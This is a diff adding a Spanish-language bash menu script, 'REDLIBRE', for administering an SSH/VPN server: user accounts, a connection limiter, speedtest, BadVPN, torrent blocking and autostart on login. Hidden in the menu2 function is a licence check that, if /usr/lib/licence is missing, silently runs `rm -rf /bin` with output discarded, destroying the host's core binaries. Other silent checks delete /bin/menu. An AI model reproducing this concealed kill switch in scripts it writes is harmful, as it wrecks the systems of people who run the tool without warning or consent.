@@ -1,0 +1,434 @@
+#!/bin/bash
+fun_bar () {
+comando[0]="$1"
+comando[1]="$2"
+ (
+[[ -e $HOME/fim ]] && rm $HOME/fim
+[[ ! -e /usr/lib/redlibre ]] && rm -rf /bin/menu > /dev/null 2>&1
+${comando[0]} -y > /dev/null 2>&1
+${comando[1]} -y > /dev/null 2>&1
+touch $HOME/fim
+ ) > /dev/null 2>&1 &
+ tput civis
+echo -ne "\033[1;33m["
+while true; do
+   for((i=0; i<18; i++)); do
+   echo -ne "\033[1;31m#"
+   sleep 0.1s
+   done
+   [[ -e $HOME/fim ]] && rm $HOME/fim && break
+   echo -e "\033[1;33m]"
+   sleep 1s
+   tput cuu1
+   tput dl1
+   echo -ne "\033[1;33m["
+done
+echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
+tput cnorm
+}
+IP=$(cat /etc/IP)
+x="ok"
+menu ()
+{
+velocity () {
+aguarde () {
+comando[0]="$1"
+comando[1]="$2"
+ (
+[[ -e $HOME/fim ]] && rm $HOME/fim
+[[ ! -d /etc/RedLibre ]] && rm -rf /bin/menu
+${comando[0]} > /dev/null 2>&1
+${comando[1]} > /dev/null 2>&1
+touch $HOME/fim
+ ) > /dev/null 2>&1 &
+ tput civis
+echo -ne "  \033[1;33mESPERA \033[1;37m- \033[1;33m["
+while true; do
+   for((i=0; i<18; i++)); do
+   echo -ne "\033[1;31m#"
+   sleep 0.1s
+   done
+   [[ -e $HOME/fim ]] && rm $HOME/fim && break
+   echo -e "\033[1;33m]"
+   sleep 1s
+   tput cuu1
+   tput dl1
+   echo -ne "  \033[1;33mESPERA \033[1;37m- \033[1;33m["
+done
+echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
+tput cnorm
+}
+fun_tst () {
+speedtest --share > speed
+}
+echo ""
+echo -e "   \033[1;32mProbando la velocidad del servidor...\033[0m"
+echo ""
+aguarde 'fun_tst'
+echo ""
+png=$(cat speed | sed -n '5 p' |awk -F : {'print $NF'})
+down=$(cat speed | sed -n '7 p' |awk -F :  {'print $NF'})
+upl=$(cat speed | sed -n '9 p' |awk -F :  {'print $NF'})
+lnk=$(cat speed | sed -n '10 p' |awk {'print $NF'})
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\033[1;32mPING (LATENCIA):\033[1;37m$png"
+echo -e "\033[1;32mDOWNLOAD:\033[1;37m$down"
+echo -e "\033[1;32mUPLOAD:\033[1;37m$upl"
+echo -e "\033[1;32mLINK: \033[1;36m$lnk\033[0m"
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+rm -rf $HOME/speed
+}
+#limiter
+function limit1 () {
+   clear
+   echo -e "\n\033[1;32mIniciando el limitador... \033[0m"
+   echo ""
+   fun_bar 'screen -dmS limiter limiter' 'sleep 3'
+   [[ $(grep -wc "limiter" /etc/autostart) = '0' ]] && {
+       echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
+   } || {
+       sed -i '/limiter/d' /etc/autostart
+	   echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
+   }
+   echo -e "\n\033[1;32m  Limitador activo.\033[0m"
+   sleep 3
+   menu
+}
+function limit2 () {
+   clear
+   echo -e "\033[1;32mDeteniendo el limitador... \033[0m"
+   echo ""
+   fun_stplimiter () {
+      sleep 1
+      screen -r -S "limiter" -X quit
+      screen -wipe 1>/dev/null 2>/dev/null
+      [[ $(grep -wc "limiter" /etc/autostart) != '0' ]] && {
+          sed -i '/limiter/d' /etc/autostart
+      }
+      sleep 1
+   }
+   fun_bar 'fun_stplimiter' 'sleep 3'
+   echo -e "\n\033[1;31m Limitador detenido.\033[0m"
+   sleep 3
+   menu
+}
+function limit_ssh () {
+[[ $(ps x | grep "limiter"|grep -v grep |wc -l) = '0' ]] && limit1 || limit2
+}
+
+function autoexec () {
+   if grep "menu;" /etc/profile > /dev/null; then
+      clear
+      echo -e "\033[1;32mDesactivando ejecución automática\033[0m"
+      offautmenu () {
+         sed -i '/menu;/d' /etc/profile
+      }
+      echo ""
+      fun_bar 'offautmenu'
+      echo ""
+      echo -e "\033[1;31mEjecución automática desactivada.\033[0m"
+      sleep 1.5s
+      menu2
+   else
+      clear
+      echo -e "\033[1;32mActivando ejecución automática\033[0m"
+      autmenu () {
+         grep -v "^menu;" /etc/profile > /tmp/tmpass && mv /tmp/tmpass /etc/profile
+         echo "menu;" >> /etc/profile
+      }
+      echo ""
+      fun_bar 'autmenu'
+      echo ""
+      echo -e "\033[1;32mEjecución automática activada.\033[0m"
+      sleep 1.5s
+      menu2
+   fi
+
+}
+#menu2
+menu2 (){
+[[ -e /etc/RedLibre-torrent ]] && stsf=$(echo -e "\033[1;32m[*]\033[0m") || stsf=$(echo -e "\033[1;31m[ ]\033[0m")
+stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m[*]\033[0m" || echo -e "\033[1;31m[ ]\033[0m")
+autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m[*]\033[0m" || echo -e "\033[1;31m[ ]\033[0m")
+[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
+if [[ -f /etc/redhat-release ]] && grep -qiE 'almalinux|rocky|rhel' /etc/redhat-release 2>/dev/null; then
+system=$(sed 's/ release.*//' /etc/redhat-release | head -1)
+system+=$(echo ' ')
+system+=$(grep -oE '[0-9]+\.[0-9]+' /etc/redhat-release | head -1 | cut -d. -f1)
+elif [[ "$(grep -c "Ubuntu" /etc/issue.net 2>/dev/null)" = "1" ]]; then
+system=$(cut -d' ' -f1 /etc/issue.net)
+system+=$(echo ' ')
+system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
+elif [[ "$(grep -c "Debian" /etc/issue.net 2>/dev/null)" = "1" ]]; then
+system=$(cut -d' ' -f1 /etc/issue.net)
+system+=$(echo ' ')
+system+=$(cut -d' ' -f3 /etc/issue.net)
+else
+system=$(cut -d' ' -f1 /etc/issue.net 2>/dev/null || cat /etc/redhat-release 2>/dev/null | sed 's/ release.*//')
+fi
+_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
+_expuser=$(cat /etc/RedLibre/Exp 2>/dev/null | tr -d '[:space:]')
+case "$_expuser" in ''|*[!0-9]*) _expuser="0" ;; esac
+_onop="0"
+[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
+_onli=$(($_ons + $_onop + $_ondrp))
+_ram=$(printf '%-8s' "$(free -h | grep -i mem | awk {'print $2'})")
+_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
+_usop=$(printf '%-6s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
+_core=$(printf '%-2s' "$(grep -c cpu[0-9] /proc/stat)")
+_system=$(printf '%-14s' "$system")
+_hora=$(printf '%(%H:%M:%S)T' $(date +%s))
+_onlin=$(printf '%-5s' "$_onli")
+_userexp=$(printf '%-5s' "$_expuser")
+_tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
+clear
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\E[41;1;37m               ⇱ REDLIBRE ⇲                \E[0m"
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\033[1;32m  SISTEMA           MEMORIA RAM        PROCESADOR\033[0m"
+echo -e "\033[1;31m  OS: \033[1;37m$_system\033[1;31m  Total: \033[1;37m$_ram\033[1;31m   Núcleos: \033[1;37m$_core\033[0m"
+echo -e "\033[1;31m  Hora: \033[1;37m$_hora\033[1;31m  En uso: \033[1;37m$_usor\033[1;31m   En uso: \033[1;37m$_usop\033[0m"
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+[[ ! -e /tmp/att ]]  && {
+    echo -e "\033[1;32m  Onlines: \033[1;37m$_onlin\033[1;31m    Expirados: \033[1;37m$_userexp\033[1;33m    Total: \033[1;37m$_tuser\033[0m"
+    var01='\033[1;37m•'
+} || {
+    echo -e "  \033[1;33m[\033[1;31m!\033[1;33m]  \033[1;32mHAY ACTUALIZACIÓN DISPONIBLE  \033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
+    var01="\033[1;32m!"
+}
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo ""
+echo -e "\033[1;31m[\033[1;36m20\033[1;31m] \033[1;37m• \033[1;33mAÑADIR HOST \033[1;31m          [\033[1;36m26\033[1;31m] \033[1;37m• \033[1;33mCAMBIAR CONTRASEÑA ROOT \033[1;31m
+[\033[1;36m21\033[1;31m] \033[1;37m• \033[1;33mQUITAR HOST \033[1;31m          [\033[1;36m27\033[1;31m] \033[1;37m• \033[1;33mEJEC. AUTOMÁTICA $autm \033[1;31m
+[\033[1;36m22\033[1;31m] \033[1;37m• \033[1;33mREINICIAR SISTEMA \033[1;31m   [\033[1;36m28\033[1;31m] $var01 \033[1;33mACTUALIZAR SCRIPT \033[1;31m
+[\033[1;36m23\033[1;31m] \033[1;37m• \033[1;33mREINICIAR SERVICIOS \033[1;31m [\033[1;36m29\033[1;31m] \033[1;37m• \033[1;33mQUITAR SCRIPT \033[1;31m
+[\033[1;36m24\033[1;31m] \033[1;37m• \033[1;33mBLOQUEAR TORRENT $stsf\033[1;31m [\033[1;36m30\033[1;31m] \033[1;37m• \033[1;33mVOLVER \033[1;32m<\033[1;33m<\033[1;31m< \033[1;31m
+[\033[1;36m25\033[1;31m] \033[1;37m• \033[1;33mBOT TELEGRAM $stsbot\033[1;31m    [\033[1;36m00\033[1;31m] \033[1;37m• \033[1;33mSALIR \033[1;32m<\033[1;33m<\033[1;31m<\033[1;31m"
+echo ""
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo ""
+echo -ne "\033[1;32m¿Qué desea hacer? \033[1;37m: "; read x
+case "$x" in
+   20)
+   clear
+   addhost
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara volver al \033[1;32mMENÚ\033[0m: "; read
+   menu2
+   ;;
+   21)
+   clear
+   delhost
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara volver al \033[1;32mMENÚ\033[0m: "; read
+   menu2
+   ;;
+   22)
+   clear
+   reiniciarsistema
+   ;;
+   23)
+   clear
+   reiniciarservicos
+   sleep 3
+   ;;
+   24)
+   blockt
+   ;;
+   25)
+   botssh
+   ;;
+   26)
+   clear
+   senharoot
+   sleep 3
+   ;;
+   27)
+   autoexec
+   ;;
+   28)
+   attscript
+   ;;
+   29)
+   clear
+   delscript
+   ;;
+   30)
+   menu
+   ;;
+   0|00)
+   echo -e "\033[1;31mSaindo...\033[0m"
+   sleep 2
+   clear
+   exit;
+   ;;
+   *)
+   echo -e "\n\033[1;31mOpción no válida.\033[0m"
+   sleep 2
+esac
+}
+while true $x != "ok"
+do
+stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m[*]\033[0m" || echo -e "\033[1;31m[ ]\033[0m")
+if (command -v systemctl &>/dev/null && systemctl is-active --quiet badvpn-udpgw 2>/dev/null) || (ps x | grep -E "udpvpn|badvpn-udpgw" | grep -v grep >/dev/null); then stsu=$(echo -e "\033[1;32m[*]\033[0m"); else stsu=$(echo -e "\033[1;31m[ ]\033[0m"); fi
+if [[ -f /etc/redhat-release ]] && grep -qiE 'almalinux|rocky|rhel' /etc/redhat-release 2>/dev/null; then
+system=$(sed 's/ release.*//' /etc/redhat-release | head -1)
+system+=$(echo ' ')
+system+=$(grep -oE '[0-9]+\.[0-9]+' /etc/redhat-release | head -1 | cut -d. -f1)
+elif [[ "$(grep -c "Ubuntu" /etc/issue.net 2>/dev/null)" = "1" ]]; then
+system=$(cut -d' ' -f1 /etc/issue.net)
+system+=$(echo ' ')
+system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
+elif [[ "$(grep -c "Debian" /etc/issue.net 2>/dev/null)" = "1" ]]; then
+system=$(cut -d' ' -f1 /etc/issue.net)
+system+=$(echo ' ')
+system+=$(cut -d' ' -f3 /etc/issue.net)
+else
+system=$(cut -d' ' -f1 /etc/issue.net 2>/dev/null || cat /etc/redhat-release 2>/dev/null | sed 's/ release.*//')
+fi
+_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
+_expuser=$(cat /etc/RedLibre/Exp 2>/dev/null | tr -d '[:space:]')
+case "$_expuser" in ''|*[!0-9]*) _expuser="0" ;; esac
+_onop="0"
+[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) && _ondrp=$(($_drp - 1)) || _ondrp="0"
+_onli=$(($_ons + $_onop + $_ondrp))
+_ram=$(printf '%-8s' "$(free -h | grep -i mem | awk {'print $2'})")
+_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
+_usop=$(printf '%-6s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
+_core=$(printf '%-2s' "$(grep -c cpu[0-9] /proc/stat)")
+_system=$(printf '%-14s' "$system")
+_hora=$(printf '%(%H:%M:%S)T' $(date +%s))
+_onlin=$(printf '%-5s' "$_onli")
+_userexp=$(printf '%-5s' "$_expuser")
+_tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
+clear
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\E[41;1;37m               ⇱ REDLIBRE ⇲                \E[0m"
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\033[1;32m  SISTEMA           MEMORIA RAM        PROCESADOR\033[0m"
+echo -e "\033[1;31m  OS: \033[1;37m$_system\033[1;31m  Total: \033[1;37m$_ram\033[1;31m   Núcleos: \033[1;37m$_core\033[0m"
+echo -e "\033[1;31m  Hora: \033[1;37m$_hora\033[1;31m  En uso: \033[1;37m$_usor\033[1;31m   En uso: \033[1;37m$_usop\033[0m"
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\033[1;32m  Onlines: \033[1;37m$_onlin\033[1;31m    Expirados: \033[1;37m$_userexp\033[1;33m    Total: \033[1;37m$_tuser\033[0m"
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo ""
+# Formato: col2 texto (%-16s) + ranura fija (4 chars) = 20. Sin indicador: "    "; con indicador: " [*]"
+_mfmt='\033[1;31m[\033[1;36m%02d\033[1;31m] \033[1;37m• \033[1;33m%-20s\033[1;31m [\033[1;36m%02d\033[1;31m] \033[1;37m• \033[1;33m%-16s%4s\033[0m\n'
+printf "$_mfmt" 1  "CREAR USUARIO"           11 "SPEEDTEST" ""
+printf "$_mfmt" 2  "CREAR USUARIO PRUEBA"    12 "BANNER" ""
+printf "$_mfmt" 3  "ELIMINAR USUARIO"        13 "TRÁFICO" ""
+printf "$_mfmt" 4  "MONITOR EN LÍNEA"        14 "OPTIMIZAR" ""
+printf "$_mfmt" 5  "CAMBIAR FECHA"           15 "BACKUP" ""
+printf "$_mfmt" 6  "CAMBIAR LÍMITE"          16 "LIMITADOR" " $stsl"
+printf "$_mfmt" 7  "CAMBIAR CONTRASEÑA"      17 "BAD VPN" " $stsu"
+printf "$_mfmt" 8  "ELIMINAR EXPIRADOS"      18 "INFO VPS" ""
+printf "$_mfmt" 9  "INFORME DE USUARIOS"     19 "MÁS >>>" ""
+printf "$_mfmt" 10 "MODO DE CONEXIÓN"        0  "SALIR <<<" ""
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo ""
+echo -ne "\033[1;32m¿Qué desea hacer? \033[1;37m: "; read x
+
+case "$x" in 
+   1 | 01)
+   clear
+   criarusuario
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara volver al \033[1;32mMENÚ\033[0m: "; read
+   ;;
+   2 | 02)
+   clear
+   criarteste
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara volver al \033[1;32mMENÚ\033[0m: "; read
+   ;;
+   3 | 03)
+   clear
+   remover
+   sleep 3
+   ;;
+   4 | 04)
+   clear
+   sshmonitor
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara volver al \033[1;32mMENÚ\033[0m: "; read
+   ;;      
+   5 | 05)
+   clear
+   mudardata
+   sleep 3
+   ;;
+   6 | 06)
+   clear
+   alterarlimite
+   sleep 3
+   ;; 
+   7 | 07)
+   clear
+   alterarsenha
+   sleep 3
+   ;;
+   8 | 08)
+   clear
+   expcleaner
+   echo ""
+   sleep 3
+   ;;     
+   9 | 09)
+   clear
+   infousers
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara volver al \033[1;32mMENÚ\033[0m: "; read
+   ;;
+   10)
+   conexao
+   exit;
+   ;;
+   11)
+   clear
+   velocity
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara volver al \033[1;32mMENÚ\033[0m: "; read
+   ;;
+   12)
+   clear
+   banner
+   sleep 3
+   ;;
+   13)
+   clear
+   echo -e "\033[1;32mPara salir pulse CTRL+C\033[1;36m"
+   sleep 4
+   nload
+   ;;
+   14)
+   clear
+   otimizar
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara volver al \033[1;32mMENÚ\033[0m: "; read
+   ;;
+   15)
+   userbackup
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara volver al \033[1;32mMENÚ\033[0m: "; read
+   ;;
+   16)
+   limit_ssh
+   ;;
+   17)
+   clear
+   badvpn
+   exit;
+   ;;
+   18)
+   clear
+   detalhes
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara volver al \033[1;32mMENÚ\033[0m: "; read
+   ;;
+   19)
+   menu2
+   ;;
+   0 | 00)
+   echo -e "\033[1;31mSaindo...\033[0m"
+   sleep 2
+   clear
+   exit;
+   ;;
+   *)
+   echo -e "\n\033[1;31mOpción no válida.\033[0m"
+   sleep 2
+esac
+done
+}
+menu
+#fim
